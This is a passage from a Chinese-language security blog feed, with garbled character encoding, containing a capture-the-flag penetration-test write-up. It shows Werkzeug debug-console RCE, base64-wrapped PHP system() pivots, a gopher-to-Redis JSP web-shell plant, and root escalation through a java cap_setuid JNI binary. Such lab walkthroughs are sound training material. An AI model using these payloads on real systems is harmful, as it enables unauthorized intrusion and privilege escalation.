class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åè¯»å–æ—¥å¿—</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token number">172.2</span>.186.6:8888/get_log_content?logFile<span class="token operator">=</span>main.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113120555016.png" alt="image-20250113120555016"></p><p>å¾—åˆ°PINç  606-570-039</p><p>ç„¶åè¿›è¡ŒPINéªŒè¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token string">"http://172.2.186.6:8888/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=606-570-039&amp;s=64cjjJmRmKNv647oy994"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.2.186.5/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span>base64_decode<span class="token punctuation">(</span><span class="token string">'Y3VybCAtYiAic2Vzc2lvbj1leUoxYzJWeUlqb2lZV1J0YVc0aWZRLlozZlJvZy5qRGFJeW9DOXNwYXpBSmtnY3dRSWFwa0dJeFUiICJodHRwOi8vMTcyLjIuMTg2LjY6ODg4OC9jb25zb2xlP19fZGVidWdnZXJfXz15ZXMmY21kPXBpbmF1dGgmcGluPTYwNi01NzAtMDM5JnM9NjRjampKbVJtS052NjQ3b3k5OTQi'</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113121001352.png" alt="image-20250113121001352"></p><p>éªŒè¯é€šè¿‡ï¼Œéœ€è¦ç”¨<code>curl -c</code>æ¥ä¿å­˜cookie</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-c</span> cookie.txt <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token string">"http://172.2.186.6:8888/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=606-570-039&amp;s=64cjjJmRmKNv647oy994"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è®¿é—®è·³æ¿æœºä¸Šçš„cookie.txt</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113121452111.png" alt="image-20250113121452111"></p><p>ç„¶åå¸¦ç€è¿™ä¸ªcookieå»å°±å¯ä»¥rceäº†ï¼Œè¿™é‡Œç›´æ¥æ–‡ä»¶è¯»å–äº†</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span>  <span class="token string">"__wzdb4206e39743d62f78f25=1736741655|a7b6c7c8a2a5"</span> <span class="token string">"http://172.2.186.6:8888/console?__debugger__=yes&amp;cmd=open('/etc/passwd','r').read()&amp;frm=0&amp;s=64cjjJmRmKNv647oy994"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113122334237.png" alt="image-20250113122334237"></p><p>flagï¼š<code>ctfshow&#123;ctfer:x:1000:1000::/home/ctfer:/bin/bash&#125;</code></p><hr><h1 id="ç¬¬äº”ç« ï¼ˆJettyï¼‰"><a href="#ç¬¬äº”ç« ï¼ˆJettyï¼‰" class="headerlink" title="ç¬¬äº”ç« ï¼ˆJettyï¼‰"></a>ç¬¬äº”ç« ï¼ˆJettyï¼‰</h1><h2 id="è‰°éš¾çš„æœ€åä¸€æ­¥"><a href="#è‰°éš¾çš„æœ€åä¸€æ­¥" class="headerlink" title="è‰°éš¾çš„æœ€åä¸€æ­¥"></a>è‰°éš¾çš„æœ€åä¸€æ­¥</h2><p>é‚£è¿™ç« å°±æ˜¯ jetty æœåŠ¡äº†ï¼š172.2.xxx.7:8080</p><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/11821">https://xz.aliyun.com/t/11821</a></p><p>æµ‹è¯•è¯»åˆ° web.xml</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250104011242035.png" alt="image-20250104011242035"></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">web-app</span> <span class="token name">PUBLIC</span><span class="token string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span><span class="token string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>Archetype Created Web Application<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- ç¯å¢ƒå‚æ•° --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-name</span><span class="token punctuation">></span></span>redis.host<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-type</span><span class="token punctuation">></span></span>java.lang.String<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-value</span><span class="token punctuation">></span></span>localhost<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-name</span><span class="token punctuation">></span></span>redis.port<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-type</span><span class="token punctuation">></span></span>java.lang.Integer<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-value</span><span class="token punctuation">></span></span>6380<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-name</span><span class="token punctuation">></span></span>redis.password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-type</span><span class="token punctuation">></span></span>java.lang.String<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-value</span><span class="token punctuation">></span></span>ctfshow_2025<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-name</span><span class="token punctuation">></span></span>redis.timeout<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-type</span><span class="token punctuation">></span></span>java.lang.Integer<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-value</span><span class="token punctuation">></span></span>10000<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-name</span><span class="token punctuation">></span></span>app_root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-type</span><span class="token punctuation">></span></span>java.lang.String<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-value</span><span class="token punctuation">></span></span>/opt/jetty/webapps/ROOT/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flagï¼š<code>ctfshow&#123;ctfshow_2025&#125;</code></p><hr><h2 id="åŠŸäºä¸€ç¯‘ï¼ˆå¤ç°ï¼‰"><a href="#åŠŸäºä¸€ç¯‘ï¼ˆå¤ç°ï¼‰" class="headerlink" title="åŠŸäºä¸€ç¯‘ï¼ˆå¤ç°ï¼‰"></a>åŠŸäºä¸€ç¯‘ï¼ˆå¤ç°ï¼‰</h2><p>ä¸€å¼€å§‹æ˜¯æƒ³åœ¨phpè·³æ¿æœºä¸Šå†™ä¸€ä¸ª php æ‰“ gopher åˆ° redis ä¸Š</p><p>ä½†æ˜¯å‘ç° curl æ˜¯æ”¯æŒ <code>dict://</code> åè®®å’Œ<code>gopher://</code>åè®®çš„</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-v</span> <span class="token string">"dict://172.2.132.7:6380/auth:ctfshow_2025"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.2.132.5/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span>base64_decode<span class="token punctuation">(</span><span class="token string">'Y3VybCAtdiAiZGljdDovLzE3Mi4yLjEzMi43OjYzODAvYXV0aDpjdGZzaG93XzIwMjUi'</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113123016886.png" alt="image-20250113123016886"></p><p>ç›´æ¥æ„é€  gopher è¯·æ±‚åŒ…å†™jspé©¬</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auth ctfshow_2025<span class="token builtin class-name">set</span> mars <span class="token string">"&lt;% Runtime.getRuntime().exec(new String[]&#123;<span class="token entity" title="\&quot;">\"</span>sh<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>-c<span class="token entity" title="\&quot;">\"</span>,request.getParameter(<span class="token entity" title="\&quot;">\"</span>cmd<span class="token entity" title="\&quot;">\"</span>)&#125;);%>"</span>config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /opt/jetty/webapps/ROOT/config <span class="token builtin class-name">set</span> dbfilename <span class="token number">2</span>.jspsavequit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>urlç¼–ç ç„¶åå‘é€</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-v</span> <span class="token string">"gopher://172.2.132.7:6380/_auth%20ctfshow_2025%0Aset%20mars%20%22%3C%25%20Runtime.getRuntime().exec(new%20String%5B%5D%7B%5C%22sh%5C%22%2C%5C%22-c%5C%22%2Crequest.getParameter(%5C%22cmd%5C%22)%7D)%3B%25%3E%22%0Aconfig%20set%20dir%20%2Fopt%2Fjetty%2Fwebapps%2FROOT%2F%0Aconfig%20set%20dbfilename%202.jsp%0Asave%0Aquit"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.2.132.5/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span>base64_decode<span class="token punctuation">(</span><span class="token string">'Y3VybCAtdiAiZ29waGVyOi8vMTcyLjIuMTMyLjc6NjM4MC9fYXV0aCUyMGN0ZnNob3dfMjAyNSUwQXNldCUyMG1hcnMlMjAlMjIlM0MlMjUlMjBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyUyMFN0cmluZyU1QiU1RCU3QiU1QyUyMnNoJTVDJTIyJTJDJTVDJTIyLWMlNUMlMjIlMkNyZXF1ZXN0LmdldFBhcmFtZXRlciglNUMlMjJjbWQlNUMlMjIpJTdEKSUzQiUyNSUzRSUyMiUwQWNvbmZpZyUyMHNldCUyMGRpciUyMCUyRm9wdCUyRmpldHR5JTJGd2ViYXBwcyUyRlJPT1QlMkYlMEFjb25maWclMjBzZXQlMjBkYmZpbGVuYW1lJTIwMi5qc3AlMEFzYXZlJTBBcXVpdCI='</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113125116304.png" alt="image-20250113125116304"></p><p>æ‰§è¡ŒæˆåŠŸï¼Œç›´æ¥rce</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.2.132.7:8080/2.jsp?cmd<span class="token operator">=</span>ls%20/<span class="token operator">></span>/opt/jetty/webapps/ROOT/success.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113180516096.png" alt="image-20250113180516096"></p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113180555193.png" alt="image-20250113180555193"></p><p>åŒæ ·çš„æ–¹å¼è¯»å–dylan.txt</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">The enemy cyber attacker 81192 has been injected with prions by our agents, and there is no chance of survival, victory is ours! The key is 7b11a7ae330883cb5bf667a9c1604635.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>flagï¼š<code>ctfshow&#123;7b11a7ae330883cb5bf667a9c1604635&#125;</code></p><hr><h2 id="ä»Šæ—¥æ–¹çŸ¥æˆ‘æ˜¯æˆ‘ï¼ˆå¤ç°ï¼‰"><a href="#ä»Šæ—¥æ–¹çŸ¥æˆ‘æ˜¯æˆ‘ï¼ˆå¤ç°ï¼‰" class="headerlink" title="ä»Šæ—¥æ–¹çŸ¥æˆ‘æ˜¯æˆ‘ï¼ˆå¤ç°ï¼‰"></a>ä»Šæ—¥æ–¹çŸ¥æˆ‘æ˜¯æˆ‘ï¼ˆå¤ç°ï¼‰</h2><p>éœ€è¦ææƒä¸ºroot</p><p>æŸ¥suid</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">find%20/%20-perm%20-u<span class="token operator">=</span>s%20-type%20f%20<span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token operator">></span>/opt/jetty/webapps/ROOT/success.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/lib/openssh/ssh-keysign/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/chsh/usr/bin/chfn/usr/bin/passwd/bin/mount/bin/umount/bin/su/bin/ping<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>GTFObins æœäº†ä¸‹æ²¡æœ‰å¯ç”¨çš„å‘½ä»¤</p><p>æŸ¥capæƒé™</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">getcap%20-r%20/%20<span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token operator">></span>/opt/jetty/webapps/ROOT/success.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/local/openjdk-8/bin/java <span class="token operator">=</span> cap_setuid+ep<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>java è®¾ç½®äº† cap_setuid æƒé™</p><p>é‚£ä¹ˆéœ€è¦ç”¨ java æ‰§è¡Œ<code>setuid(0)</code>çš„æ“ä½œï¼Œç„¶è€Œjavaå¹¶ä¸åƒpythoné‚£æ ·æœ‰ä¸“é—¨çš„ os.setuid å¯ä»¥è®¾ç½®</p><p>éœ€è¦é€šè¿‡ JNI + setuid å®ç°ï¼Œå‚è€ƒ <a href="https://stackoverflow.com/questions/5985597/jni-setuid-question">https://stackoverflow.com/questions/5985597/jni-setuid-question</a></p><p>è¿™é‡ŒæŒ‰ç…§å®˜æ–¹wpçš„åšæ³•ï¼š</p><p>åˆ©ç”¨ç¼–ç å†™å…¥ SetUID.c:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;jni.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>JNIEXPORT jint JNICALL <span class="token function">Java_SetUID_setUID</span><span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span>env<span class="token punctuation">,</span> jobject obj<span class="token punctuation">,</span> jint uid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">setuid</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">2</span>.jsp?cmd<span class="token operator">=</span>echo%20<span class="token string">"I2luY2x1ZGUgPGpuaS5oPgovLzExMTExMTExMTExMjIKI2luY2x1ZGUgPHVuaXN0ZC5oPgoKSk5JRVhQT1JUIGppbnQgSk5JQ0FMTCBKYXZhX1NldFVJRF9zZXRVSUQoSk5JRW52ICplbnYsIGpvYmplY3Qgb2JqLCBqaW50IHVpZCkgewogICAgcmV0dXJuIHNldHVpZCh1aWQpOwp9"</span>%20<span class="token operator">|</span>base64%20-d%2<span class="token operator"><span class="token file-descriptor important">0</span>></span>/opt/jetty/webapps/ROOT/SetUID.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å†™å…¥ SetUID.javaï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SetUID</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">loadLibrary</span><span class="token punctuation">(</span><span class="token string">"SetUID"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">int</span> <span class="token function">setUID</span><span class="token punctuation">(</span><span class="token keyword">int</span> uid<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">SetUID</span> setUID <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SetUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> result <span class="token operator">=</span> setUID<span class="token punctuation">.</span><span class="token function">setUID</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">Runtime</span><span class="token punctuation">.</span>getRuntime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"sh"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"cat /root/*.txt>/opt/jetty/webapps/ROOT/root.txt"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">2</span>.jsp?cmd<span class="token operator">=</span>echo%20<span class="token string">"cHVibGljIGNsYXNzIFNldFVJRCB7CiAgICBzdGF0aWMgewogICAgICAgIFN5c3RlbS5sb2FkTGlicmFyeSgiU2V0VUlEIik7IAogICAgfQoKICAgIHB1YmxpYyBuYXRpdmUgaW50IHNldFVJRChpbnQgdWlkKTsgCiAgLy9hCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmdbXSBhcmdzKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBTZXRVSUQgc2V0VUlEID0gbmV3IFNldFVJRCgpOwogICAgICAgIGludCByZXN1bHQgPSBzZXRVSUQuc2V0VUlEKDApOyAKICAgICAgICBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyBTdHJpbmdbXXsic2giLCItYyIsImNhdCAvcm9vdC8qLnR4dD4vb3B0L2pldHR5L3dlYmFwcHMvUk9PVC9yb290LnR4dCJ9KTsKICAgIH0KfQ=="</span>%20<span class="token operator">|</span>base64%20-d%2<span class="token operator"><span class="token file-descriptor important">0</span>></span>/opt/jetty/webapps/ROOT/SetUID.java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¼–è¯‘ c å’Œ java æ–‡ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">2</span>.jsp?cmd<span class="token operator">=</span>gcc%20-shared%20-fPIC%20-o%20/opt/jetty/webapps/ROOT/libSetUID.so%20-I<span class="token variable">$&#123;JAVA_HOME&#125;</span>/include%20-I<span class="token variable">$&#123;JAVA_HOME&#125;</span>/include/linux%20/opt/jetty/webapps/ROOT/SetUID.c<span class="token number">2</span>.jsp?cmd<span class="token operator">=</span>javac%20/opt/jetty/webapps/ROOT/SetUID.java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä»¥rootæƒé™æ‰§è¡Œå‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">2</span>.jsp?cmd<span class="token operator">=</span>java%20-Djava.library.path<span class="token operator">=</span>/opt/jetty/webapps/ROOT/%20-cp%20/opt/jetty/webapps/ROOT/%20SetUID<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ° &#x2F;root&#x2F;message.txt çš„å†…å®¹</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113183415373.png" alt="image-20250113183415373"></p><p>flagï¼š<code>ctfshow&#123;http://8.11.9.2&#125;</code></p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250114003547864.png" alt="image-20250114003547864"></p><p>End</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;é©¬ä¸Šå°±è¦æœŸæœ«è€ƒä½†è¿˜æ˜¯æ¥æ‰“äº†ï¼Œç»™3-1å›°äº†å¥½å‡ å¤©ï¼Œè¿˜å¥½æœ€åæ²¡æŒ‚ç§‘ï¼ˆ&lt;/p&gt;
&lt;p&gt;å®˜æ–¹wpï¼š&lt;a href=&quot;https://ysynrh77rj.feishu.cn/docx/F3nJdGJHjo1DSBx8c2TcecLrnvh&quot;&gt;https://ysynrh77rj.feishu.cn/docx/F3nJdGJHjo1DSBx8c2TcecLrnvh&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="æ¸—é€" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Jacksonååºåˆ—åŒ–</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-12-24T03:44:13.000Z</published>
    <updated>2024-12-24T16:42:16.821Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å­¦æœŸåˆçˆ½å­¦ä¸€æ¬¡Javaï¼Œå­¦æœŸæœ«å†çˆ½å­¦ä¸€æ¬¡JavağŸ˜‹</p><p>å‚è€ƒï¼š</p><p><a href="https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/#0x01-Jackson-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8">https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/#0x01-Jackson-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8</a></p><p><a href="https://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/">https://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/</a></p><p><a href="https://zer0peach.github.io/2023/09/27/Jackson/">https://zer0peach.github.io/2023/09/27/Jackson/</a></p><span id="more"></span><hr><h1 id="JacksonåŸºæœ¬ä½¿ç”¨"><a href="#JacksonåŸºæœ¬ä½¿ç”¨" class="headerlink" title="JacksonåŸºæœ¬ä½¿ç”¨"></a>JacksonåŸºæœ¬ä½¿ç”¨</h1><p>Jackson æ˜¯ä¸€ä¸ªå¼€æºçš„Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–å·¥å…·ï¼Œå¯ä»¥å°† Java å¯¹è±¡åºåˆ—åŒ–ä¸º XML æˆ– JSON æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œä»¥åŠå°† XML æˆ– JSON æ ¼å¼çš„å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸º Java å¯¹è±¡ã€‚</p><p>ç”±äºå…¶ä½¿ç”¨ç®€å•ï¼Œé€Ÿåº¦è¾ƒå¿«ï¼Œä¸”ä¸ä¾é é™¤ JDK 